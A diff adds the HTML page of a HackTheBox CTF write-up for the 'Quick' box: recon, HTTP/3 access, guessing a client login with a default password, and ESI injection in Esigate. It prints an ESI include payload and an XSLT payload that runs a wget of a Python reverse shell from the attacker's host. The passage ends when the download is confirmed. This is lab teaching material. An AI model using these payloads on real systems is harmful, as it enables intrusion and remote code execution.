@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Another week, another box retired on HackTheBox: Quick!This box was awesome and, I will say it again, this is my new favorite box. It was made by MrR3boot and was really well designed, exploiting">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Quick">
+<meta property="og:url" content="https://hg8.sh/posts/quick/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Another week, another box retired on HackTheBox: Quick!This box was awesome and, I will say it again, this is my new favorite box. It was made by MrR3boot and was really well designed, exploiting">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82158612-47288200-9889-11ea-8c3d-86e4a5d2f758.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81215955-69ddaf80-8fda-11ea-8d0a-25c3ca958f8d.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81219118-934d0a00-8fdf-11ea-9183-78eb86352b68.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81219897-c3e17380-8fe0-11ea-9f2c-e8b58dbee0cb.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81220687-06f01680-8fe2-11ea-9ea9-2fd039e1b67b.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81221053-972e5b80-8fe2-11ea-869f-e91fdfba6953.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81222017-ef199200-8fe3-11ea-997f-e1bb0e493899.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81221861-b11c6e00-8fe3-11ea-8867-f31b2879c607.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81413960-944c7b80-9146-11ea-9fb2-60f63e4ac950.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81414231-f1483180-9146-11ea-82f5-5f2e217aa836.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81414862-e772fe00-9147-11ea-8a35-1b3366cef609.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81424811-cf56ab00-9156-11ea-9f80-110af7481354.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81425687-607a5180-9158-11ea-92d4-cf4faf6106ed.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81426297-48570200-9159-11ea-9bc9-7e977e20b31c.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81426543-a257c780-9159-11ea-8a9a-379f338ed4c2.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81426943-3b86de00-915a-11ea-9ec4-9953d2c9b50f.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81426943-3b86de00-915a-11ea-9ec4-9953d2c9b50f.png">
+<meta property="article:published_time" content="2020-08-28T22:00:00.000Z">
+<meta property="article:modified_time" content="2020-08-28T17:30:57.023Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="quick">
+<meta property="article:tag" content="http3">
+<meta property="article:tag" content="esigate">
+<meta property="article:tag" content="ESI injection">
+<meta property="article:tag" content="custom exploitation">
+<meta property="article:tag" content="CUPS">
+<meta property="article:tag" content="printer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82158612-47288200-9889-11ea-8c3d-86e4a5d2f758.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>HackTheBox - Quick :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/magic/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP3-gt-portal-quick-htb"><span class="toc-number">1.2.</span> <span class="toc-text">HTTP3 -&gt; portal.quick.htb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Client-credentials"><span class="toc-number">1.3.</span> <span class="toc-text">Client credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESI-Injection-to-remote-code-execution"><span class="toc-number">1.4.</span> <span class="toc-text">ESI Injection to remote code execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Automating-ESI-injection-to-RCE"><span class="toc-number">1.5.</span> <span class="toc-text">Automating ESI injection to RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-sam-gt-srvadm"><span class="toc-number">2.2.</span> <span class="toc-text">Pivot sam -&gt; srvadm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cached-configuration"><span class="toc-number">2.3.</span> <span class="toc-text">Cached configuration</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Quick
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-08-28T22:00:00.000Z" itemprop="datePublished">29-08-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      20 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="584" alt="quick-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158612-47288200-9889-11ea-8c3d-86e4a5d2f758.png">
+
+
+
+<p>Another week, another box retired on HackTheBox: Quick!<br>This box was awesome and, I will say it again, this is my new favorite box. It was made by MrR3boot and was really well designed, exploiting a lot a real life scenario and requiring you to take your time to understand what was going on and how to progress step-by-step. While a bit long to solve (at least for me) I highly recommend you to give a try on this “Quick” box.</p>
+<p><strong>Tl;Dr:</strong> The user flag was accessible after multiple steps. First you had to access a <code>portal</code> website available only through HTTP3 protocol, a not so easy task since most common tools don’t support it yet. From this <code>portal</code> you coud access documentation with a generic password to access clients account. Using the name, the company and the country of one of the client (displayed on a testimonial page) it was possible to guess a valid client email address and use the generic password to access a Support page. From this support page it was possible to exploit an ESI (Edge Side Includes) Injection to achieve remote code execution as <code>sam</code> user and grab the user flag from there.<br>For the root flag you first had to pivot from the <code>sam</code> user to <code>srvadm</code> user. To do so you had to exploit a weakness in a printing web app mechanism; this allows to exfiltrate <code>srvadm</code> SSH key and connect to its account. From <code>srvadm</code> a cached config file leak the <code>root</code> account password, letting you connect to it to grab the flag. </p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<p>First thing first, let’s add the box IP to the hosts file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.186 quick.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>and let’s start!</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC quick.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 17:25 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> quick.htb (10.10.10.186)</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">9001/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Quick | Broadband Services</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>We have a classical web app, running on port 9001 this time, and the SSH port 22 open.</p>
+<p>Opening <code>http://quick.htb:9001</code> display a following page:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81215955-69ddaf80-8fda-11ea-8d0a-25c3ca958f8d.png" alt="quick homepage"></p>
+<p>The <strong>Get Started</strong> button lead to login page. Since we do not have any credentials yet, let’s skip it for now.<br>The update message seems interesting:</p>
+<blockquote>
+<p><strong>Update!</strong></p>
+<p>We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our <a href="https://portal.quick.htb/" target="_blank" rel="noopener">portal</a></p>
+<p>You might experience some connectivity issues during portal access which we are aware of and working on designing client application to provide better experience for our users. Till then you can avail our services from Mobile App</p>
+</blockquote>
+<p>The <code>portal</code> links to a new subdomain: <code>https://portal.quick.htb/</code>. Let’s add it to our hosts file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.186 portal.quick.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>And see what’s on there:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl https://portal.quick.htb</span><br><span class="line">curl: (7) Failed to connect to portal.quick.htb port 443: Connection refused</span><br></pre></td></tr></table></figure>
+
+<p>Connexion refused? Well that’s odd and disappointing. Thinking about it it’s not that odd since <code>nmap</code> didn’t show any <code>443</code> port open. Then what ?<br>This sentence mades us think a little:</p>
+<blockquote>
+<p>We are migrating our portal with latest TLS and HTTP support. </p>
+</blockquote>
+<p>As far as I know the latest TLS version is 1.3 and out since 2018, so nothing to brag about. But on HTTP side, a new version have recently been proposed by the IETF (Internet Engineering Task Force): Hypertext Transfer Protocol Version 3 (HTTP/3). </p>
+<p>Reading the wikipedia page of HTTP/3 we can notice a very interesting information for us:</p>
+<blockquote>
+<p>HTTP/3 is the upcoming third major version of the Hypertext Transfer Protocol used to exchange information on the World Wide Web, succeeding HTTP/2. </p>
+<p>HTTP/3 is a draft based on a previous RFC draft, then named “Hypertext Transfer Protocol (HTTP) over QUIC”. QUIC is a transport layer network protocol developed initially by Google where user space congestion control is used over the User Datagram Protocol (UDP).</p>
+<p>[…]</p>
+<p>Although its name was initially proposed as the acronym for “Quick UDP Internet Connections”, IETF’s use of the word QUIC is not an acronym; it is simply the name of the protocol.</p>
+<p>Among other applications, QUIC improves performance of connection-oriented web applications that are currently using TCP.</p>
+<p><a href="https://en.wikipedia.org/wiki/HTTP/3" target="_blank" rel="noopener">HTPP/3 - Wikipedia</a></p>
+</blockquote>
+<p>Two interesting informations here: </p>
+<ol>
+<li>“QUIC” protocol sounds awfully like our “Quick” box name.</li>
+<li>“QUIC is a transport layer network protocol […] used over the User Datagram Protocol (UDP).”</li>
+</ol>
+<p>So when using HTTP/3, the packets are sent over UDP and not the traditional TCP. </p>
+<p>The <code>nmap</code> scan we always do at the beginning do not check for UDP ports (<code>-sU</code> option) for the sake of scan speed. That’s the reason we didn’t see any 443 TCP port open, because it’s probably 443 UDP. </p>
+<h3 id="HTTP3-gt-portal-quick-htb"><a href="#HTTP3-gt-portal-quick-htb" class="headerlink" title="HTTP3 -&gt; portal.quick.htb"></a>HTTP3 -&gt; portal.quick.htb</h3><p>To check if our scenario is correct let’s make a connection to <code>https://portal.quick.htb</code> but using HTTP/3 this time:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man curl | grep -A 2 http3</span><br><span class="line">       --http3</span><br><span class="line">              Tells curl to use HTTP version 3 directly to the host and port number </span><br><span class="line">              used <span class="keyword">in</span> the URL.</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --http3 https://portadl.quick.htb</span><br><span class="line">curl: option --http3: the installed libcurl version doesn<span class="string">'t support this</span></span><br><span class="line"><span class="string">curl: try '</span>curl --<span class="built_in">help</span><span class="string">' for more information</span></span><br></pre></td></tr></table></figure>
+
+<p>Bummer, the default version of <code>libcurl</code> do not support <code>http3</code>. We are going to need to compile our own <code>libcurl</code> with http3 support.</p>
+<p>I will use the <code>Quiche</code> version as shown in curl <a href="https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version" target="_blank" rel="noopener">documentation</a>.<br><em>Tips: If you are using Arch based distribution, an AUR package is available: <a href="https://aur.archlinux.org/packages/curl-http3" target="_blank" rel="noopener"><code>curl-http3</code></a></em>.</p>
+<p>Once we have our <code>curl</code> version with http3 support, let’s retry our request:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl3 --http3 https://portal.quick.htb</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt; Quick | Customer Portal&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Quick | Portal&lt;/h1&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt; Welcome to Quick User Portal&lt;/p&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">"index.php"</span>&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">"index.php?view=contact"</span>&gt;Contact&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">"index.php?view=about"</span>&gt;About&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">"index.php?view=docs"</span>&gt;References&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Bingo! We have a few pages available from this small portal website.  The <code>index.php?view=docs</code> contains PDF documentations:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl3 --http3 <span class="string">"https://portal.quick.htb/index.php?view=docs"</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Quick | References&lt;/h1&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">"docs/QuickStart.pdf"</span>&gt;Quick-Start Guide&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">"docs/Connectivity.pdf"</span>&gt;Connectivity Guide&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>Connectivity.pdf</code> looks especially interesting, let’s download it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl3 --http3 <span class="string">"https://portal.quick.htb/docs/Connectivity.pdf"</span> -o Connectivity.pdf</span><br></pre></td></tr></table></figure>
+
+<p>Open <code>Connectivity.pdf</code> displays the following documentation:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81219118-934d0a00-8fdf-11ea-9183-78eb86352b68.png" alt="quick connectivity documentation"></p>
+<p>This gives us a valuable information. It’s possible for clients to connect to their router using their email address and <code>Quick4cc3$$</code> as password. Seems that once connected, clients can access WiFi configuration and access a support ticket system. </p>
+<h3 id="Client-credentials"><a href="#Client-credentials" class="headerlink" title="Client credentials"></a>Client credentials</h3><p>Let’s go back to the home page at <code>http://quick.htb:9001</code>. We have a few informations about clients, their company and their country. Unfortunately no email address available. We may need to guess one client email address.</p>
+<p>One testimonial catch the attention because of the mention to “WiFi”. This user surely use the router service as presented in the <code>Connectivity.pdf</code> documentation right ?</p>
+<blockquote>
+<p>I never regret using Quick services. Super fast wifi and no issues.<br>–By Elisa (Wink Media)</p>
+</blockquote>
+<p>The <code>http://quick.htb:9001/clients.php</code> page informs us that the <code>Wink</code> company is based in UK:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81219897-c3e17380-8fe0-11ea-9f2c-e8b58dbee0cb.png" alt="quick client page"></p>
+<p>So we have a client name (Elisa), her company (Wink Media) and her country (UK). From those informations we should be able to create a little custom email wordlist, something like:</p>
+<ul>
+<li><a href="mailto:elisa@wink.co.uk">elisa@wink.co.uk</a></li>
+<li><a href="mailto:elisa@winkmedia.co.uk">elisa@winkmedia.co.uk</a></li>
+<li><a href="mailto:elisa@wink-media.co.uk">elisa@wink-media.co.uk</a></li>
+<li>…</li>
+</ul>
+<p>Elisa looks like the perfect target since we know for sure she used the WiFi service as described in the documentation. But if her account does not work we might need to make email wordlist like this for other clients aswell. </p>
+<p>So let’s go back to the login page and try to login using our credentials list. We could script it but since we only have a few possibilities so far, let’s try by hand. Let’s try <code>elisa@wink.co.uk</code>:<code>Quick4cc3$$</code>:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81220687-06f01680-8fe2-11ea-9ea9-2fd039e1b67b.png" alt="quick login page elisa"></p>
+<p>And success! We are logged in as Elisa and have access to a support ticketing system: </p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81221053-972e5b80-8fe2-11ea-869f-e91fdfba6953.png" alt="quick ticket"></p>
+<p>From this panel it’s possible to create support ticket and to view them. After checking the ticket system is not vulnerable to SQL Injection. </p>
+<p>It is vulnerable to XSS injection:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81222017-ef199200-8fe3-11ea-997f-e1bb0e493899.png" alt="quick xss"> </p>
+<p>Script gets executed when the ticket is loaded:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81221861-b11c6e00-8fe3-11ea-8867-f31b2879c607.png" alt="quick xss alert"></p>
+<p>While it’s cool I am pretty sure this won’t be useful to progress. Let’s continue our investigation.</p>
+<p>Looking back at our initial recon we notice an unusual server being used: <code>X-Powered-By: Esigate</code>.<br>According to its website:</p>
+<blockquote>
+<p><em>Esigate</em> is a http proxy, with full support of  ESI specification and additional features to make web application  integration fast and easy.<br><a href="http://www.esigate.org/" target="_blank" rel="noopener">http://www.esigate.org/</a></p>
+</blockquote>
+<p>Since I didn’t know about ESI specification I checked online. W3C describe it this way:</p>
+<blockquote>
+<p>Edge Side Includes (ESI) is an XML-based markup language that provides a means to assemble resources in HTTP clients. Unlike other in-markup languages, ESI is designed to leverage client tools like caches to improve end-user perceived performance, reduce processing overhead on the origin server, and enhanced availability. ESI allows for dynamic content assembly at the edge of the network, whether it is in a Content Delivery Network, end-user’s browser, or in a “Reverse Proxy” right next to the origin server.</p>
+<p><a href="https://www.w3.org/TR/esi-lang/" target="_blank" rel="noopener">https://www.w3.org/TR/esi-lang/</a></p>
+</blockquote>
+<p>While checking online for more informations about ESI, Google return an interesting result: “<a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/" target="_blank" rel="noopener">ESI Injection: Abusing specific implementations</a>“.</p>
+<blockquote>
+<p>Some vendors implemented the possibility to include XML content that is transformed using XML Stylesheet Language Transformations. Only one occurrence was found vulnerable. We are presenting the exploit scenario affecting ESIGate version lower than 5.3.</p>
+</blockquote>
+<p>That’s sound exactly like our scenario. Let’s give it a try on the only page we can input data in, the ticket system.</p>
+<h3 id="ESI-Injection-to-remote-code-execution"><a href="#ESI-Injection-to-remote-code-execution" class="headerlink" title="ESI Injection to remote code execution"></a>ESI Injection to remote code execution</h3><p>First let’s create two files on our machine, <code>dummy.xml</code> and <code>rce.xsl</code>, and open a web server to serve those two files. Just as a test to make sure our injection worked, let’s leave our two files empty. If our server receive connexion we can confirm our injection worked.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ls </span><br><span class="line">dummy.xml rce.xsl</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>
+
+<p>Let’s fill a new ticket with the following payload as described on the vulnerability page:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">"http://10.10.10.10:8000/dummy.xml"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">stylesheet</span>=<span class="string">"http://10.10.10.10:8000/rce.xsl?"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">esi:include</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/9076747/81413960-944c7b80-9146-11ea-9fb2-60f63e4ac950.png" alt="quick ticket esi injection"></p>
+<p>The ticket is created under <code>TKT-3426</code>. Opening it make the server crash, that’s a good sign…</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81414231-f1483180-9146-11ea-82f5-5f2e217aa836.png" alt="quick server crash"></p>
+<p>A better sign is that the app indeed made a call to our two files:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.186 - - [08/May/2020 16:13:43] <span class="string">"GET /dummy.xml HTTP/1.1"</span> 200 -</span><br><span class="line">10.10.10.186 - - [08/May/2020 16:13:43] <span class="string">"GET /rce.xsl HTTP/1.1"</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<p>So we got the confirmation our ESI injection succeed. Let’s now try to edit the payload in <code>rce.xls</code> to download a python reserve shell that we can run later:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">"xml"</span> <span class="attr">omit-xml-declaration</span>=<span class="string">"yes"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:rt</span>=<span class="string">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"hg8"</span>&gt;</span>&lt;![CDATA[wget 10.10.10.10:8000/hg8.py -O /tmp/hg8.py]]&gt;<span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"rtObj"</span> <span class="attr">select</span>=<span class="string">"rt:getRuntime()"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"process"</span> <span class="attr">select</span>=<span class="string">"rt:exec($rtObj, $hg8)"</span>/&gt;</span></span><br><span class="line">Process: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"$process"</span>/&gt;</span></span><br><span class="line">Command: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"$hg8"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Then let’s open a new ticket so our new <code>xls</code> file get executed:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81414862-e772fe00-9147-11ea-8a35-1b3366cef609.png" alt="quick esi injection reverse shell"></p>
+<p>Our server confirms that the file got downloaded successfully:</p>
